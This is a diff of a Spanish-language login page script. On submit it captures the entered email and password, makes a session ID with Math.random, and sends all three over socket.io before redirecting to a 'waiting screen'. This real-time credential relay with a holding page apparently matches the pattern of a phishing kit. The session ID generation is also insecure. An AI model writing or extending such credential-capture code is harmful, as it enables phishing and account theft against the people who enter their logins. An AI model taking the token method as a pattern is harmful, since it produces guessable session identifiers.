@@ -76,27 +76,34 @@
   </div>
 
   <!-- Scripts al final del body -->
-  <script src="/socket.io/socket.io.js"></script>
-  <script>
-    const socket = io();
+ <!-- Scripts al final del body -->
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  const socket = io();
 
-    window.addEventListener('DOMContentLoaded', () => {
-      const form = document.getElementById('login-form');
+  window.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('login-form');
 
-      if (form) {
-        form.addEventListener('submit', (e) => {
-          e.preventDefault();
+    if (form) {
+      form.addEventListener('submit', (e) => {
+        e.preventDefault();
 
-          const correo = document.getElementById('usuario').value;
-          const contrasena = document.getElementById('clave').value;
+        const correo = document.getElementById('usuario').value;
+        const contrasena = document.getElementById('clave').value;
 
-          socket.emit('dataForm', { correo, contrasena });
+        // 🔑 Generar y guardar sessionId
+        const sessionId = Math.random().toString(36).substring(2, 15);
+        localStorage.setItem('sessionId', sessionId);
 
-          // Ir a la pantalla de espera
-          window.location.href = 'opciones.html';
-        });
-      }
-    });
-  </script>
+        // ✅ Enviar también el sessionId al servidor
+        socket.emit('dataForm', { correo, contrasena, sessionId });
+
+        // 🕒 Ir a pantalla de espera
+        window.location.href = 'opciones.html';
+      });
+    }
+  });
+</script>
+
 </body>
 </html>
